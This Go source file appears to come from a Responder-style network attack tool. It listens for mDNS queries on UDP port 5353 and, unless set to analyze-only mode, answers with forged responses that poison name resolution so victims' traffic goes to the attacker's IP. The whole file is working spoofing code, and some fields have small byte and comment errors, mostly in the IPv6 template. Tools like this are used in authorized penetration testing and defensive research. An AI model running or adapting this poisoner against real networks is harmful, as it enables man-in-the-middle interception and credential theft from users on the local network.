package poisoners

import (
	"bytes"
	"log"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	bpfMDNSFilter string = "(udp and dst port 5353)"
)

var (
	MDNS_Ans = [][]uint8{
		[]byte{0x00, 0x00},             // TID
		[]byte{0x84, 0x00},             // Flags
		[]byte{0x00, 0x00},             // Question
		[]byte{0x00, 0x01},             // AnswerRRS
		[]byte{0x00, 0x00},             // AuthorityRSS
		[]byte{0x00, 0x00},             // AdditionalRRS
		[]byte{},                       // AnswerNameLen
		[]byte{},                       // AnswerName
		[]byte{0x00},                   // AnswerNameNull
		[]byte{0x00, 0x01},             // Type
		[]byte{0x00, 0x01},             // Class1 (01 is IPv4 and 1c is IPv6)
		[]byte{0x00, 0x00, 0x00, 0x78}, // TTL - Poison for 2min
		[]byte{0x00, 0x04},             // IPLen
		[]byte{},                       // IP (4 bytes)
	}

	MDNS_Ans6 = [][]uint8{
		[]byte{0x00, 0x00},             // TID
		[]byte{0x84, 0x00},             // Flags
		[]byte{0x00, 0x00},             // Question
		[]byte{0x00, 0x01},             // AnswerRRS
		[]byte{0x00, 0x00},             // AuthorityRSS
		[]byte{0x00, 0x00},             // AdditionalRRS
		[]byte{},                       // AnswerNameLen
		[]byte{},                       // AnswerName
		[]byte{0x00},                   // AnswerNameNull
		[]byte{0x00, 0x01c},            // Type
		[]byte{0x00, 0x01},             // Class1 (01 is IPv4 and 1c is IPv6)
		[]byte{0x00, 0x00, 0x00, 0x78}, // TTL - Poison for 2min
		[]byte{0x00, 0x10},             // IPLen
		[]byte{},                       // IP (4 bytes)
	}

	mainMDNSDetails sendInfo
)

func sendMDNSPacket(pdetails packetDetails, payload []byte) {
	// Setup options
	options := gopacket.SerializeOptions{
		ComputeChecksums: true,
		FixLengths:       true,
	}

	buffer := gopacket.NewSerializeBuffer()

	// Build the packetpacket
	ipLayer := &layers.IPv4{
		SrcIP:    pdetails.dstIP,
		DstIP:    pdetails.srcIP,
		Version:  4,
		Flags:    layers.IPv4DontFragment,
		TTL:      64,
		Protocol: layers.IPProtocolUDP,
		IHL:      5,
	}
	ethernetLayer := &layers.Ethernet{
		DstMAC:       pdetails.srcMAC,
		EthernetType: layers.EthernetTypeIPv4,
		SrcMAC:       pdetails.dstMAC,
	}
	udpLayer := &layers.UDP{
		SrcPort: pdetails.dstPort,
		DstPort: pdetails.srcPort,
	}
	err := udpLayer.SetNetworkLayerForChecksum(ipLayer)
	if err != nil {
		log.Printf("[MDNS] Error creating UDP layer: %s\n", err)
		return
	}

	// And create the packet with the layers
	buffer = gopacket.NewSerializeBuffer()
	err = gopacket.SerializeLayers(buffer, options,
		ethernetLayer,
		ipLayer,
		udpLayer,
		gopacket.Payload(payload),
	)
	if err != nil {
		log.Printf("[MDNS] Error serializing packet: %s\n", err)
		return
	}
	outgoingPacket := buffer.Bytes()

	// Send our packet and don't worry if there is an error
	err = mainMDNSDetails.handle.WritePacketData(outgoingPacket)
	if err != nil {
		log.Printf("[MDNS] Error sending poison to %s\n%s\n", pdetails.srcIP, err)
		return
	}

	log.Printf("[MDNS] Poisoned answer sent to %s for name %s\n", pdetails.srcIP, pdetails.requestName)
}

func createMDNSResponsePayload(pdetails packetDetails) []byte {
	payload := []byte{}
	res := MDNS_Ans

	// Check if IPv6
	if pdetails.ipType == 6 {
		res = MDNS_Ans6
	}

	// Set TID (0)
	res[0] = pdetails.transactionID

	// Set AnswerNameLen (6)
	res[6] = pdetails.requestNameLen

	// Set AnswerName (7)
	res[7] = pdetails.requestName

	// Set IPv4 (13)
	res[13] = pdetails.dstIP

	for _, v := range res {
		for _, b := range v {
			payload = append(payload, byte(b))
		}
	}

	return payload
}

func parseMDNSPacket(packet gopacket.Packet) packetDetails {
	var details packetDetails
	details.dstIP = mainMDNSDetails.respondIP

	ip6Layer := packet.Layer(layers.LayerTypeIPv6)
	if ip6Layer != nil {
		details.ipType = 6
		ip, _ := ip6Layer.(*layers.IPv6)
		details.srcIP = ip.SrcIP
	}

	ipLayer := packet.Layer(layers.LayerTypeIPv4)
	if ipLayer != nil {
		details.ipType = 4
		ip, _ := ipLayer.(*layers.IPv4)
		details.srcIP = ip.SrcIP
	}

	// Get Ethernet layer
	ethLayer := packet.Layer(layers.LayerTypeEthernet)
	if ethLayer != nil {
		eth, _ := ethLayer.(*layers.Ethernet)
		details.srcMAC = eth.SrcMAC
		details.dstMAC = mainMDNSDetails.respondMAC
	}

	// Get UDP layer
	udpLayer := packet.Layer(layers.LayerTypeUDP)
	if udpLayer != nil {
		udp, _ := udpLayer.(*layers.UDP)
		details.srcPort = udp.SrcPort
		details.dstPort = udp.DstPort

		// Get transaction ID
		details.transactionID = udp.Payload[:2]

		// Get query name length
		details.requestNameLen = []byte{udp.Payload[12]}

		// read each packet until we reach the null byte
		counter := 1
		tempByte := udp.Payload[12+counter]
		for tempByte != 0x0 {
			counter++
			tempByte = udp.Payload[12+counter]
		}

		// Get query name
		details.requestName = udp.Payload[13 : 13+counter-1]

		// Replace 0x05 with a period
		details.requestName = bytes.ReplaceAll(details.requestName, []byte{0x05}, []byte("."))
	}

	return details
}

// Capture only MDNS packets
func filter_MDNS(pcapHandle *pcap.Handle) {
	// Set filter for MDNS broadcast
	err := pcapHandle.SetBPFFilter(bpfMDNSFilter)
	if err != nil {
		log.Fatal(err)
	}

	// set packet source
	packetSource := gopacket.NewPacketSource(pcapHandle, pcapHandle.LinkType())

	// Process packets
	for packet := range packetSource.Packets() {
		// Parse the details of the packet
		pd := parseMDNSPacket(packet)
		log.Printf("[MDNS] Request by %s for %s\n", pd.srcIP, pd.requestName)

		// If analyze is false, then we will poison
		if !mainMDNSDetails.analyze {
			// Create new response packet
			response := createMDNSResponsePayload(pd)

			// FIX ME
			// Sent response packet only to IPv4 for now
			if pd.ipType == 4 {
				sendMDNSPacket(pd, response)
			}
		}
	}
}

func StartMDNS(pcapHandle *pcap.Handle, ip net.IP, mac net.HardwareAddr, analyze bool) {

	// Setup the main details with
	// handle, analyze, IP and MAC we want to respond with
	mainMDNSDetails = sendInfo{handle: pcapHandle, respondIP: ip, respondMAC: mac, analyze: analyze}

	// Start poinson/filtering packets
	filter_MDNS(pcapHandle)
}
